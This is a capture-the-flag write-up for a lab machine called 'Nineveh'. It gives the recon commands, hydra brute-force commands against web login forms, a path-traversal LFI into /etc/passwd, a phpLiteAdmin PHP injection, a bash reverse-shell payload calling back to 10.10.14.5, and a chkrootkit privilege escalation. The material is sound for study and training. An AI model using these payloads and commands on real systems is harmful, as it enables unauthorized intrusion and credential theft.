* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)

![alt text](./img/nineveh00.PNG?raw=true)  

## Recon-Enumeration  
sudo masscan -p1-65535 10.10.10.43 -e tun0 --rate=1000  
![alt text](./img/nineveh01.PNG?raw=true)  

nmap -A -sC -v -p 80,443 10.10.10.43  
![alt text](./img/nineveh02.PNG?raw=true)  

gobuster dir -u http://10.10.10.43 -w ~/wordlists/big.txt -t 100 -e -x php,html,aspx,txt,xml  
![alt text](./img/nineveh03.PNG?raw=true)  

Ok, let’s access those pages  
![alt text](./img/nineveh04.PNG?raw=true)  

Accessing the department page we are redirect to a login page  
![alt text](./img/nineveh05.PNG?raw=true)  

Looking the source code we found something interesting  
![alt text](./img/nineveh06.PNG?raw=true)  

So we now know that MYSQL is installed AND a probable username is AMROIS. So lets try it  
amrois:admin  
![alt text](./img/nineveh07.PNG?raw=true)  

Ok… maybe not. Let’s try the default admin:admin  
![alt text](./img/nineveh08.PNG?raw=true)  

Hummmm, the message changed, so we found a valid username: ADMIN. Now we can use hydra to bruteforce this login  
Using the develop tools we can found the request (you can use BURPSUITE too)  
![alt text](./img/nineveh09.PNG?raw=true)  

hydra -l admin -P ~/wordlists/rockyou.txt 10.10.10.43 http-form-post "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -t 64  
![alt text](./img/nineveh10.PNG?raw=true)  

admin:1q2w3e4r5t  
![alt text](./img/nineveh10.PNG?raw=true)  

## Exploit  

Ok, since we have PLENTY of options. let’s click on “Notes”  
![alt text](./img/nineveh12.PNG?raw=true)  

More messages from AMROIS, but this URL looks vulnerable to LFI  
![alt text](./img/nineveh13.PNG?raw=true)  

FAIL! Ok, so let’s enumerate harder  

Let’s run gobuster with our authentication cookie    
![alt text](./img/nineveh14.PNG?raw=true)  

gobuster dir -u http://10.10.10.43/department -w ~/wordlists/big.txt -t 100 -e -x php,html,aspx,txt,xml -c PHPSESSID=qq5sal61bn2aal30dr3tspi725  
![alt text](./img/nineveh15.PNG?raw=true)  

Ok, since i got stuck here i review my notes and notice i run gobuster on http. So i decided to try on https  
gobuster dir -u https://10.10.10.43 -w ~/wordlists/big.txt -t 100 -e -x php,html,aspx,txt,xml -c PHPSESSID=qq5sal61bn2aal30dr3tspi725 -k  
![alt text](./img/nineveh16.PNG?raw=true)  

Wow, a new page…  
![alt text](./img/nineveh17.PNG?raw=true)  

Let’s see if exists any exploit to this app  
searchsploit phpliteadmin  
![alt text](./img/nineveh18.PNG?raw=true)  

searchsploit -x php/webapps/24044.txt  
![alt text](./img/nineveh19.PNG?raw=true)  

Looks simple…. but we don’t have the password…. maybe admin?  
![alt text](./img/nineveh20.PNG?raw=true)  

So let’s try use hydra again  
hydra -l admin -P ~/wordlists/rockyou.txt 10.10.10.43 https-form-post "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -t 64  
![alt text](./img/nineveh21.PNG?raw=true)  

This admin have some problems with decent passwords…  
password123  
![alt text](./img/nineveh22.PNG?raw=true)  

Now let’s follow the exploit  
- Create a .php new database  
![alt text](./img/nineveh23.PNG?raw=true)  

- Click on the database on the left corner  
- Now create a new table in this database and insert a text field with the default value  
-- <?php phpinfo()?>  
![alt text](./img/nineveh24.PNG?raw=true)  
Here we could see that the noob.php is located on /var/tmp/noob.php  

![alt text](./img/nineveh25.PNG?raw=true)  

Ok, now we need to discover how to access the page  
Return to http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt  
Let’s try harder here……...after some time we discover this one worked  
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes/../../../../../../etc/passwd  
![alt text](./img/nineveh26.PNG?raw=true)  

So now we can access our noob.php page  
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes/../../../../../../var/tmp/noob.php  
![alt text](./img/nineveh27.PNG?raw=true)  

Great, now let’s change the php code to the above:  
- <?php system("bash -c ''bash -i >& /dev/tcp/10.10.14.5/443 0>&1''");?>  
![alt text](./img/nineveh28.PNG?raw=true)  
  
![alt text](./img/nineveh29.PNG?raw=true)    
  
![alt text](./img/nineveh30.PNG?raw=true)  

- Start a netcat listener  
- Access the page again  

![alt text](./img/nineveh52.PNG?raw=true)  
  
HABEMUS SHELL \o/  

## Privesc  

Get a better shell:  
- python3 -c 'import pty;pty.spawn("/bin/bash")'  
- export TERM=xterm  

Let’s grab the first flag  
![alt text](./img/nineveh31.PNG?raw=true)  

Dammm, running the above command we notice that the file belongs to amrois  
ls -al  
![alt text](./img/nineveh32.PNG?raw=true)  

So let’s find other files that belong to this user  
find / -user amrois 2>/dev/null  
![alt text](./img/nineveh33.PNG?raw=true)  

Let’s check those last two  
cat /var/mail/amrois  
![alt text](./img/nineveh34.PNG?raw=true)  

Hummm ok, so maybe it’s some kind of routine to activate something with door knock  
Let’s try it  

Searching on web i could find:  
- An interesting explanation about how to configure port knnock [HERE](https://www.howtogeek.com/442733/how-to-use-port-knocking-on-linux-and-why-you-shouldnt/)  
-- It talk about a conf file /etc/knockd.conf. Let’s see if it exists on the machine  
-- cat /etc/knockd.conf  
![alt text](./img/nineveh35.PNG?raw=true)  
-- Ok, so the port knock opens the SSH port  
- And how to do port knocking with nmap [HERE](https://security.stackexchange.com/questions/209746/how-to-use-nmap-as-a-port-knocking-client)  
-- nmap 10.10.10.43 -p 571,290,911 -r --max-retries 0 --max-parallelism 1 --host-timeout 100  

After some time a could open the SSH port  
![alt text](./img/nineveh36.PNG?raw=true)  

Ok….but we don’t have the password. How can we get it.  
Hummm i remember we found a secure_notes directory that it doesn’t have nothing important…. maybe we can check it again  
![alt text](./img/nineveh37.PNG?raw=true)  

Since it is on ssl folder maybe we can access it with our browser  
![alt text](./img/nineveh38.PNG?raw=true)  

Looks to be only a imagem, however it took some time to open it. Let’s check with exiftools if there is something hidden  
I like to use this website: http://exif.regex.info/, but you can use exiftool  
![alt text](./img/nineveh39.PNG?raw=true)  

Maybe there is some hidden data here. Let’s try strings, maybe we can find something  
![alt text](./img/nineveh40.PNG?raw=true)  

Wow, a id_rsa key….great. Let’s copy it ad try to use it to login  
cat id_rsa.nineveh  
![alt text](./img/nineveh41.PNG?raw=true)  
  
![alt text](./img/nineveh42.PNG?raw=true)  

Great, now let’s grab the flag  
![alt text](./img/nineveh43.PNG?raw=true)  

“sudo -l” asks for the password, so let’s try the other file we had found earlier  
![alt text](./img/nineveh44.PNG?raw=true)  

Nothing really useful  
Let’s enumerate harder  
There is a /report folder that belongs to the user  
![alt text](./img/nineveh45.PNG?raw=true)  

Ok, looks interesting. Searching “ROOTDIR is '/'” we found something  
![alt text](./img/nineveh46.PNG?raw=true)  

https://www.exploit-db.com/exploits/33899  
![alt text](./img/nineveh47.PNG?raw=true)  

So we need create a malicious executable update file and place it on /tmp  
![alt text](./img/nineveh48.PNG?raw=true)  

![alt text](./img/nineveh49.PNG?raw=true)  

Start the netcat listener  
- nc -nvlp 4444  
- Just wait  

![alt text](./img/nineveh50.PNG?raw=true)  

Grab the flag  
![alt text](./img/nineveh51.PNG?raw=true)  
